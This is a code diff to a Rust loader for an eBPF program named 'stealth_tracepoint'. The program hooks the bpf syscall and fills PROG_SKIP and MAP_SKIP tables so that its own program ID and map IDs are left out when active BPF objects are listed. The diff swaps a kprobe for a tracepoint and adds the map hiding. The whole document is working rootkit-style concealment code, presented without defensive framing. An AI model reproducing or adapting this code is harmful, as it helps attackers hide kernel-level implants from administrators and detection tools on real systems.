@@ -1,16 +1,11 @@
-use std::{fs, thread, time::Duration};
+use std::{thread, time::Duration};
 
-use anyhow::Context as _;
-use aya::{
-    maps::HashMap,
-    programs::{KProbe, TracePoint},
-    Btf,
-};
+use aya::{maps::HashMap, programs::TracePoint};
 
 #[rustfmt::skip]
 use log::{debug, warn};
 use clap::Parser;
-use libbpf_rs::query::ProgInfoIter;
+use libbpf_rs::query::{MapInfoIter, ProgInfoIter};
 use tokio::signal;
 
 #[derive(Parser, Debug)]
@@ -28,6 +23,15 @@ fn list_active_programs() -> Vec<u32> {
         active_programs.push(prog.id);
     }
     active_programs
+}
+#[inline]
+fn list_active_maps() -> Vec<u32> {
+    let iter = MapInfoIter::default();
+    let mut active_maps = Vec::<u32>::new();
+    for prog in iter {
+        active_maps.push(prog.id);
+    }
+    active_maps
 }
 // bpf_obj_get_next_id(&attr, uattr.user,
 //     &prog_idr, &prog_idr_lock)
@@ -54,11 +58,6 @@ async fn main() -> anyhow::Result<()> {
         eprintln!("This program must be run as root");
         std::process::exit(1);
     }
-    let progs_id = Arg::parse()
-        .prog
-        .into_iter()
-        .flatten()
-        .collect::<Vec<u32>>();
 
     // Bump the memlock rlimit. This is needed for older kernels that don't use the
     // new memcg based accounting, see https://lwn.net/Articles/837122/
@@ -85,22 +84,59 @@ async fn main() -> anyhow::Result<()> {
         warn!("failed to initialize eBPF logger: {}", e);
     }
 
-    let program0: &mut TracePoint = ebpf.program_mut("stealth_tracepoint").unwrap().try_into()?;
-    program0.load()?;
-    program0.attach("syscalls", "sys_enter_bpf")?;
-    let program: &mut KProbe = ebpf.program_mut("stealth_probe").unwrap().try_into()?;
+    let program: &mut TracePoint = ebpf.program_mut("stealth_tracepoint").unwrap().try_into()?;
     program.load()?;
-    program.attach("bpf_obj_get_next_id", 0)?;
+    program.attach("syscalls", "sys_enter_bpf")?;
+    let prog_info = program.info().unwrap();
+    let prog_id = prog_info.id();
+    let mut prog_maps = prog_info.map_ids().unwrap().unwrap();
+    prog_maps.sort();
+
     let ctrl_c = signal::ctrl_c();
     let mut prog_skip_map: HashMap<_, u32, u32> =
         HashMap::try_from(ebpf.take_map("PROG_SKIP").unwrap()).unwrap();
+    let mut map_skip_map: HashMap<_, u32, u32> =
+        HashMap::try_from(ebpf.take_map("MAP_SKIP").unwrap()).unwrap();
 
-    thread::spawn(move || loop {
-        thread::sleep(Duration::from_millis(1000));
-        let active_programs = list_active_programs();
-        for p in active_programs.into_iter() {
-            if let Err(err) = prog_skip_map.insert(&p, &0, 0) {
-                //error!("Error inserting map key : {}", err)
+    thread::spawn({
+        move || loop {
+            thread::sleep(Duration::from_millis(1000));
+            let active_programs = list_active_programs();
+            let mut prev_id: u32 = 0;
+            for p in active_programs.into_iter() {
+                if p == prog_id {
+                    prog_skip_map.insert(prev_id, prog_id, 0).unwrap();
+                    break;
+                } else {
+                    prev_id = p;
+                }
+            }
+
+            let mut prev_id: u32 = 0;
+            let active_maps = list_active_maps();
+            let n_active_maps = active_maps.len();
+            for (idx, m) in active_maps.iter().enumerate() {
+                for to_skip_map in prog_maps.iter() {
+                    if m == to_skip_map {
+                        let to_insert_map_id: u32 = match idx < n_active_maps {
+                            true => {
+                                let mut id = *to_skip_map;
+                                for next_id in active_maps.as_slice()[idx..].into_iter() {
+                                    if !prog_maps.contains(next_id) {
+                                        id = *next_id;
+                                        break;
+                                    }
+                                }
+                                id
+                            }
+                            false => *to_skip_map,
+                        };
+
+                        map_skip_map.insert(prev_id, to_insert_map_id, 0).unwrap();
+                        break;
+                    }
+                }
+                prev_id = *m;
             }
         }
     });
